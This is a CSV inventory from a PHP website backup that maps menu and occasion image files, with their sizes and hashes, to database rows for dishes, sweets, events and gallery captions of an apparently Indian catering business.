88.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/88.jpg,13483,4b8a95a3e8517ee648f4eb5366ae3c38c358f8c05a869e3e87ea064a96a3c7f9,50049ebd4c81212736554d7c909f584f,DB Mapped (Verified),menu_item_tbl,88,Kafuli,menu_small_img
89.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/89.jpeg,8210,4fa3f68cc11a3e721a22e11cff837130da84fc359deeefd3e36ce8c320769dd8,547503e7bc1eb4fa9f554f2fe1f22ced,DB Mapped (Verified),menu_item_tbl,89,Thechwani,menu_img
89.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/89.jpeg,8210,4fa3f68cc11a3e721a22e11cff837130da84fc359deeefd3e36ce8c320769dd8,547503e7bc1eb4fa9f554f2fe1f22ced,DB Mapped (Verified),menu_item_tbl,89,Thechwani,menu_small_img
90.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/90.jpg,21086,77dc5ae78bcd6d51f9a1de0a31dbb8476d31746382d4c32b35c4bf24b68a39d3,372b24628e75592a572631929db259af,DB Mapped (Verified),menu_item_tbl,90,Bhang Ki Chutney,menu_img
90.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/90.jpg,21086,77dc5ae78bcd6d51f9a1de0a31dbb8476d31746382d4c32b35c4bf24b68a39d3,372b24628e75592a572631929db259af,DB Mapped (Verified),menu_item_tbl,90,Bhang Ki Chutney,menu_small_img
91.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/91.jpg,7824,00ebb4250aff98677bebcedd1fd3625da182e121f0824cbf8763d02abd4a5e2f,1defd289536e7c6c21b93d297054ce83,DB Mapped (Verified),menu_item_tbl,91,Garhwal ka Fannah,menu_img
91.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/91.jpg,7824,00ebb4250aff98677bebcedd1fd3625da182e121f0824cbf8763d02abd4a5e2f,1defd289536e7c6c21b93d297054ce83,DB Mapped (Verified),menu_item_tbl,91,Garhwal ka Fannah,menu_small_img
92.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/92.jpg,12980,fbe05c9ffdb2a63c71d32b05f0dd703e0ca1f65bcd1467dcc1661c12dad476bd,f23fa7b9efe5a4702fd48196465e6dc8,DB Mapped (Verified),menu_item_tbl,92,Phaanu,menu_img
92.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/92.jpg,12980,fbe05c9ffdb2a63c71d32b05f0dd703e0ca1f65bcd1467dcc1661c12dad476bd,f23fa7b9efe5a4702fd48196465e6dc8,DB Mapped (Verified),menu_item_tbl,92,Phaanu,menu_small_img
93.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/93.jpg,95943,54b44b9e4ad4641d57fd9fe0c404f1b941a0385d9e8dcf06409af92c504ceade,aff18760baa9ecd4eefa54ea937e1d64,DB Mapped (Verified),menu_item_tbl,93,Baadi,menu_img
93.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/93.jpg,95943,54b44b9e4ad4641d57fd9fe0c404f1b941a0385d9e8dcf06409af92c504ceade,aff18760baa9ecd4eefa54ea937e1d64,DB Mapped (Verified),menu_item_tbl,93,Baadi,menu_small_img
94.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/94.jpg,37263,79d4876ca6a41ae4f773707aead2db89b3c03bb8af49e61e5723c98cb4d00f74,fa29bd04d7e4d0ab99f429d578a83c12,DB Mapped (Verified),menu_item_tbl,94,Kandalee Ka Saag,menu_img
94.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/94.jpg,37263,79d4876ca6a41ae4f773707aead2db89b3c03bb8af49e61e5723c98cb4d00f74,fa29bd04d7e4d0ab99f429d578a83c12,DB Mapped (Verified),menu_item_tbl,94,Kandalee Ka Saag,menu_small_img
95.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/95.jpg,15165,9ce4e570fb71320a71b92fe46a52b39902a01e4bc75d988587ea7edcd64a7914,db6d2e9b748268b8038e4fdc93389f2b,DB Mapped (Verified),menu_item_tbl,95,Chainsoo,menu_img
95.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/95.jpg,15165,9ce4e570fb71320a71b92fe46a52b39902a01e4bc75d988587ea7edcd64a7914,db6d2e9b748268b8038e4fdc93389f2b,DB Mapped (Verified),menu_item_tbl,95,Chainsoo,menu_small_img
96.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/96.jpeg,8925,1eebcc4ee5fd1017119ae0f28ed5a56cb66ef97e639aa87728fbe449849dcd53,1faa0996ae7dc943ee5d0ece81aef631,DB Mapped (Verified),menu_item_tbl,96,Kumaoni Raita,menu_img
96.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/96.jpeg,8925,1eebcc4ee5fd1017119ae0f28ed5a56cb66ef97e639aa87728fbe449849dcd53,1faa0996ae7dc943ee5d0ece81aef631,DB Mapped (Verified),menu_item_tbl,96,Kumaoni Raita,menu_small_img
97.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/97.jpg,13807,4f748acd76a5b404b9a78d4f1c25d6c6ca3160d63600c327d9ac78de54806cb1,383a56c81ce3ce22295cd7021e2e3096,DB Mapped (Verified),menu_item_tbl,97,Dubuk,menu_img
97.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/97.jpg,13807,4f748acd76a5b404b9a78d4f1c25d6c6ca3160d63600c327d9ac78de54806cb1,383a56c81ce3ce22295cd7021e2e3096,DB Mapped (Verified),menu_item_tbl,97,Dubuk,menu_small_img
98.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/98.jpg,33488,a5a59e31051ec5717778f58515afc7d3ff54bd38c63e950b29193218ad33c592,3e69b63b96ca9ecc2ff017c839136dc1,DB Mapped (Verified),menu_item_tbl,98,Kadhi Badi,menu_img
98.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/98.jpg,33488,a5a59e31051ec5717778f58515afc7d3ff54bd38c63e950b29193218ad33c592,3e69b63b96ca9ecc2ff017c839136dc1,DB Mapped (Verified),menu_item_tbl,98,Kadhi Badi,menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/occasions/1.jpg,47101,e766698055aaba4df3da071f4c6891fcac87a1badeaaa8d21cb3b1c714e1e58c,573b727bcae1e21c95ed97fea00dc6ab,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/occasions/1.jpg,47101,e766698055aaba4df3da071f4c6891fcac87a1badeaaa8d21cb3b1c714e1e58c,573b727bcae1e21c95ed97fea00dc6ab,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/occasions/1.jpg,47101,e766698055aaba4df3da071f4c6891fcac87a1badeaaa8d21cb3b1c714e1e58c,573b727bcae1e21c95ed97fea00dc6ab,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/occasions/1.jpg,47101,e766698055aaba4df3da071f4c6891fcac87a1badeaaa8d21cb3b1c714e1e58c,573b727bcae1e21c95ed97fea00dc6ab,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/occasions/1.jpg,47101,e766698055aaba4df3da071f4c6891fcac87a1badeaaa8d21cb3b1c714e1e58c,573b727bcae1e21c95ed97fea00dc6ab,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/occasions/1.jpg,47101,e766698055aaba4df3da071f4c6891fcac87a1badeaaa8d21cb3b1c714e1e58c,573b727bcae1e21c95ed97fea00dc6ab,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
1.png,old-website-php/Full-website-backup/frontEnd/occasions/1.png,908344,4562606f26f73c6beef9919642644bf82d73df4a2eef0b518be861fe3d640262,833ef9f64f6cbb88eac423d0f78c1924,DB Mapped (Verified),event_requirement,1,New Year Party,event_img
10.jpg,old-website-php/Full-website-backup/frontEnd/occasions/10.jpg,36607,e5431b53ac7740d430063360aaae2c9f46b23d478508567d9b1bd067f6a49f34,3932372dd9cb6118a1aa667a37edeef6,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/occasions/10.jpg,36607,e5431b53ac7740d430063360aaae2c9f46b23d478508567d9b1bd067f6a49f34,3932372dd9cb6118a1aa667a37edeef6,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/occasions/10.jpg,36607,e5431b53ac7740d430063360aaae2c9f46b23d478508567d9b1bd067f6a49f34,3932372dd9cb6118a1aa667a37edeef6,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/occasions/10.jpg,36607,e5431b53ac7740d430063360aaae2c9f46b23d478508567d9b1bd067f6a49f34,3932372dd9cb6118a1aa667a37edeef6,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/occasions/11.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/occasions/11.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/occasions/11.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/occasions/11.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/occasions/11.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/occasions/12.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/occasions/12.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/occasions/12.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/occasions/12.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/occasions/13.jpg,50614,c7ffcd2e06ffb68a2d0083a7bc489073bebbf5a16a3805bde6b419fc0fe81391,47cd091e5419e2d9f6a782c643a27fff,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/occasions/13.jpg,50614,c7ffcd2e06ffb68a2d0083a7bc489073bebbf5a16a3805bde6b419fc0fe81391,47cd091e5419e2d9f6a782c643a27fff,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/occasions/13.jpg,50614,c7ffcd2e06ffb68a2d0083a7bc489073bebbf5a16a3805bde6b419fc0fe81391,47cd091e5419e2d9f6a782c643a27fff,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/occasions/13.jpg,50614,c7ffcd2e06ffb68a2d0083a7bc489073bebbf5a16a3805bde6b419fc0fe81391,47cd091e5419e2d9f6a782c643a27fff,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/occasions/13.jpg,50614,c7ffcd2e06ffb68a2d0083a7bc489073bebbf5a16a3805bde6b419fc0fe81391,47cd091e5419e2d9f6a782c643a27fff,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
14.jpg,old-website-php/Full-website-backup/frontEnd/occasions/14.jpg,28838,8a8c10547a728cb42a74c7b8493251ec461991f935c456424846df1f80d85506,a5f8d6e363959f6a4100feaae6578947,DB Mapped (Verified),product_item_tbl,14,Chhena Murgi,menu_img
14.jpg,old-website-php/Full-website-backup/frontEnd/occasions/14.jpg,28838,8a8c10547a728cb42a74c7b8493251ec461991f935c456424846df1f80d85506,a5f8d6e363959f6a4100feaae6578947,DB Mapped (Verified),website_gallery,14,Event at Delhi,gimage
14.jpg,old-website-php/Full-website-backup/frontEnd/occasions/14.jpg,28838,8a8c10547a728cb42a74c7b8493251ec461991f935c456424846df1f80d85506,a5f8d6e363959f6a4100feaae6578947,DB Mapped (Verified),worke_work_experience,14,tarters Dishes by12,workproimg
15.jpg,old-website-php/Full-website-backup/frontEnd/occasions/15.jpg,37473,7765d70493af870cee841877787af55ab9b8584bf777657e89807d02ca81ca42,ea6286b9e1486895fb1ef82d4f2a161f,DB Mapped (Verified),product_item_tbl,15,Desi Ghee Bundi,menu_img
15.jpg,old-website-php/Full-website-backup/frontEnd/occasions/15.jpg,37473,7765d70493af870cee841877787af55ab9b8584bf777657e89807d02ca81ca42,ea6286b9e1486895fb1ef82d4f2a161f,DB Mapped (Verified),website_gallery,15,Event at DPS school Gurugram,gimage
15.jpg,old-website-php/Full-website-backup/frontEnd/occasions/15.jpg,37473,7765d70493af870cee841877787af55ab9b8584bf777657e89807d02ca81ca42,ea6286b9e1486895fb1ef82d4f2a161f,DB Mapped (Verified),worke_work_experience,15,Desserts Dishes by1,workproimg
16.jpg,old-website-php/Full-website-backup/frontEnd/occasions/16.jpg,54397,080eb907be6990efecf2ae82fd47fb9366e1251d5ba3811df3a2a726be290df5,c2a45c123d2270e6df62006650d0fc20,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/occasions/16.jpg,54397,080eb907be6990efecf2ae82fd47fb9366e1251d5ba3811df3a2a726be290df5,c2a45c123d2270e6df62006650d0fc20,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/occasions/16.jpg,54397,080eb907be6990efecf2ae82fd47fb9366e1251d5ba3811df3a2a726be290df5,c2a45c123d2270e6df62006650d0fc20,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
17.jpg,old-website-php/Full-website-backup/frontEnd/occasions/17.jpg,40045,25a0f6952fc98e864ab51d07d02b62c7621ac391527cc3e362b73a24ea36fced,e7750cb8df419d4a88bbce7cbba337df,DB Mapped (Verified),product_item_tbl,17,Desi Ghee Gujia,menu_img
17.jpg,old-website-php/Full-website-backup/frontEnd/occasions/17.jpg,40045,25a0f6952fc98e864ab51d07d02b62c7621ac391527cc3e362b73a24ea36fced,e7750cb8df419d4a88bbce7cbba337df,DB Mapped (Verified),website_gallery,17,Event at DPS school Gurugram,gimage
17.jpg,old-website-php/Full-website-backup/frontEnd/occasions/17.jpg,40045,25a0f6952fc98e864ab51d07d02b62c7621ac391527cc3e362b73a24ea36fced,e7750cb8df419d4a88bbce7cbba337df,DB Mapped (Verified),worke_work_experience,17,Desserts Dishes by2,workproimg
18.jpeg,old-website-php/Full-website-backup/frontEnd/occasions/18.jpeg,84290,0ce87e48adb64d85fa5050065f6dbce8dc43a78a6893c9b26ec5a4735c11901c,8faa29818781609c9c64df0a05e44734,Static / Orphaned Disk Asset,,,,
18.jpg,old-website-php/Full-website-backup/frontEnd/occasions/18.jpg,32782,501ee4d5c502f288edce9a9850d0d00520cc37de15e703a63bb13a391913992a,3a1a6b95d60f9c1df32d6b1a80b72dc9,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/occasions/18.jpg,32782,501ee4d5c502f288edce9a9850d0d00520cc37de15e703a63bb13a391913992a,3a1a6b95d60f9c1df32d6b1a80b72dc9,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/occasions/18.jpg,32782,501ee4d5c502f288edce9a9850d0d00520cc37de15e703a63bb13a391913992a,3a1a6b95d60f9c1df32d6b1a80b72dc9,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/occasions/18.jpg,32782,501ee4d5c502f288edce9a9850d0d00520cc37de15e703a63bb13a391913992a,3a1a6b95d60f9c1df32d6b1a80b72dc9,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
19.jpg,old-website-php/Full-website-backup/frontEnd/occasions/19.jpg,37134,fc3f8e0e21bfd606aeeb6f6214cf02dde205538cb4c6b55cd3f28715e3598841,24a1290a11439f838927837fe8ea2bb8,DB Mapped (Verified),product_item_tbl,19,Dry Fruit Patisha,menu_img
19.jpg,old-website-php/Full-website-backup/frontEnd/occasions/19.jpg,37134,fc3f8e0e21bfd606aeeb6f6214cf02dde205538cb4c6b55cd3f28715e3598841,24a1290a11439f838927837fe8ea2bb8,DB Mapped (Verified),website_gallery,19,Event at Delhi,gimage
19.jpg,old-website-php/Full-website-backup/frontEnd/occasions/19.jpg,37134,fc3f8e0e21bfd606aeeb6f6214cf02dde205538cb4c6b55cd3f28715e3598841,24a1290a11439f838927837fe8ea2bb8,DB Mapped (Verified),worke_work_experience,19,reakfast Dishes by1,workproimg
2.jpg,old-website-php/Full-website-backup/frontEnd/occasions/2.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/occasions/2.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/occasions/2.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/occasions/2.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/occasions/2.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/occasions/2.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
2.png,old-website-php/Full-website-backup/frontEnd/occasions/2.png,1220916,3274b2a15fd091202b6fcd515f037f3dff2d89fd3a9a6a721140f578e5b9f629,89e40c4ae56cdb528e25ac9d260db7e0,DB Mapped (Verified),event_requirement,2,Christmas Party,event_img
3.jpg,old-website-php/Full-website-backup/frontEnd/occasions/3.jpg,36602,d30f819748806e13591ca097d3fb551839b285e886b4533b1df448cb9a5ff20b,4822d337dbbd0d2788b727599ec5f3b1,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/occasions/3.jpg,36602,d30f819748806e13591ca097d3fb551839b285e886b4533b1df448cb9a5ff20b,4822d337dbbd0d2788b727599ec5f3b1,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/occasions/3.jpg,36602,d30f819748806e13591ca097d3fb551839b285e886b4533b1df448cb9a5ff20b,4822d337dbbd0d2788b727599ec5f3b1,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/occasions/3.jpg,36602,d30f819748806e13591ca097d3fb551839b285e886b4533b1df448cb9a5ff20b,4822d337dbbd0d2788b727599ec5f3b1,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/occasions/3.jpg,36602,d30f819748806e13591ca097d3fb551839b285e886b4533b1df448cb9a5ff20b,4822d337dbbd0d2788b727599ec5f3b1,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
3.png,old-website-php/Full-website-backup/frontEnd/occasions/3.png,162427,0279df32e3ec82bda5bf82db3aed33cc2b93d51ba3d318e6d44676818a4aaa80,5a1df916b85372e2c2a4f0e7b74e9cff,DB Mapped (Verified),event_requirement,3,Diwali Party/Puja,event_img
4.jpg,old-website-php/Full-website-backup/frontEnd/occasions/4.jpg,37037,143e62a035a160445cded324e3b7c5f6d2fea01e68420aada4cb6a1224da7f83,b15d16221c8d843421d132506f237641,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/occasions/4.jpg,37037,143e62a035a160445cded324e3b7c5f6d2fea01e68420aada4cb6a1224da7f83,b15d16221c8d843421d132506f237641,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/occasions/4.jpg,37037,143e62a035a160445cded324e3b7c5f6d2fea01e68420aada4cb6a1224da7f83,b15d16221c8d843421d132506f237641,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/occasions/4.jpg,37037,143e62a035a160445cded324e3b7c5f6d2fea01e68420aada4cb6a1224da7f83,b15d16221c8d843421d132506f237641,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/occasions/4.jpg,37037,143e62a035a160445cded324e3b7c5f6d2fea01e68420aada4cb6a1224da7f83,b15d16221c8d843421d132506f237641,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
4.png,old-website-php/Full-website-backup/frontEnd/occasions/4.png,433948,13c125114f65291993e24f22c52c2849dac5611b563c1005e370ba11b51d3f1b,a0d93e6f9a120a17cb22c769cf274c74,DB Mapped (Verified),event_requirement,4,Bhai Dooj,event_img
5.jpg,old-website-php/Full-website-backup/frontEnd/occasions/5.jpg,32544,7a1563e4ca5d324d34aee08fdd37d4601f918e17259a04a912e8d48ec50c06d2,7f2a730b4325f06bd9b6f921b620b71f,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/occasions/5.jpg,32544,7a1563e4ca5d324d34aee08fdd37d4601f918e17259a04a912e8d48ec50c06d2,7f2a730b4325f06bd9b6f921b620b71f,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/occasions/5.jpg,32544,7a1563e4ca5d324d34aee08fdd37d4601f918e17259a04a912e8d48ec50c06d2,7f2a730b4325f06bd9b6f921b620b71f,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/occasions/5.jpg,32544,7a1563e4ca5d324d34aee08fdd37d4601f918e17259a04a912e8d48ec50c06d2,7f2a730b4325f06bd9b6f921b620b71f,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
5.png,old-website-php/Full-website-backup/frontEnd/occasions/5.png,120460,ced84e75c37dee7d6bc6b8c0ed070ff16d55db6248f1e930d5748ac2e1d16a2a,37549dffa71c148cd51ebee10dbbc0e3,Static / Orphaned Disk Asset,,,,
6.jpg,old-website-php/Full-website-backup/frontEnd/occasions/6.jpg,46796,e0784944752905da578539b7fc1e127cd61d8c0c95ae8ea1a9ef1fdb6708ae43,1184bc89fceb61bb90b41cefda39fa1e,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/occasions/6.jpg,46796,e0784944752905da578539b7fc1e127cd61d8c0c95ae8ea1a9ef1fdb6708ae43,1184bc89fceb61bb90b41cefda39fa1e,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/occasions/6.jpg,46796,e0784944752905da578539b7fc1e127cd61d8c0c95ae8ea1a9ef1fdb6708ae43,1184bc89fceb61bb90b41cefda39fa1e,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/occasions/6.jpg,46796,e0784944752905da578539b7fc1e127cd61d8c0c95ae8ea1a9ef1fdb6708ae43,1184bc89fceb61bb90b41cefda39fa1e,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/occasions/6.jpg,46796,e0784944752905da578539b7fc1e127cd61d8c0c95ae8ea1a9ef1fdb6708ae43,1184bc89fceb61bb90b41cefda39fa1e,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/occasions/6.jpg,46796,e0784944752905da578539b7fc1e127cd61d8c0c95ae8ea1a9ef1fdb6708ae43,1184bc89fceb61bb90b41cefda39fa1e,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/occasions/7.jpg,32159,ee4f2e38bd3c5b0aeda62c96c95f722d6d2e1c0c1fa6f1ae918c8477ae580c7c,fe9329cdd338d1ede8d0b2df1eef7d49,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/occasions/7.jpg,32159,ee4f2e38bd3c5b0aeda62c96c95f722d6d2e1c0c1fa6f1ae918c8477ae580c7c,fe9329cdd338d1ede8d0b2df1eef7d49,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/occasions/7.jpg,32159,ee4f2e38bd3c5b0aeda62c96c95f722d6d2e1c0c1fa6f1ae918c8477ae580c7c,fe9329cdd338d1ede8d0b2df1eef7d49,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/occasions/7.jpg,32159,ee4f2e38bd3c5b0aeda62c96c95f722d6d2e1c0c1fa6f1ae918c8477ae580c7c,fe9329cdd338d1ede8d0b2df1eef7d49,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/occasions/7.jpg,32159,ee4f2e38bd3c5b0aeda62c96c95f722d6d2e1c0c1fa6f1ae918c8477ae580c7c,fe9329cdd338d1ede8d0b2df1eef7d49,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
8.jpg,old-website-php/Full-website-backup/frontEnd/occasions/8.jpg,32193,7ae1e3f22b4e7407645227af60e25d2015679c49c663a2d77010904b4b401b38,6a60eafe3426b45cd3d8658ef7233e07,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/occasions/8.jpg,32193,7ae1e3f22b4e7407645227af60e25d2015679c49c663a2d77010904b4b401b38,6a60eafe3426b45cd3d8658ef7233e07,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/occasions/8.jpg,32193,7ae1e3f22b4e7407645227af60e25d2015679c49c663a2d77010904b4b401b38,6a60eafe3426b45cd3d8658ef7233e07,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/occasions/8.jpg,32193,7ae1e3f22b4e7407645227af60e25d2015679c49c663a2d77010904b4b401b38,6a60eafe3426b45cd3d8658ef7233e07,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.png,old-website-php/Full-website-backup/frontEnd/occasions/9.png,57766,ed0fe35f3bf4f74fb4d8cc46deea636d48009f38c1fe9f9537f09dd48b5417ac,2c2e9829cddc201fc36e815786aeb2f0,Static / Orphaned Disk Asset,,,,
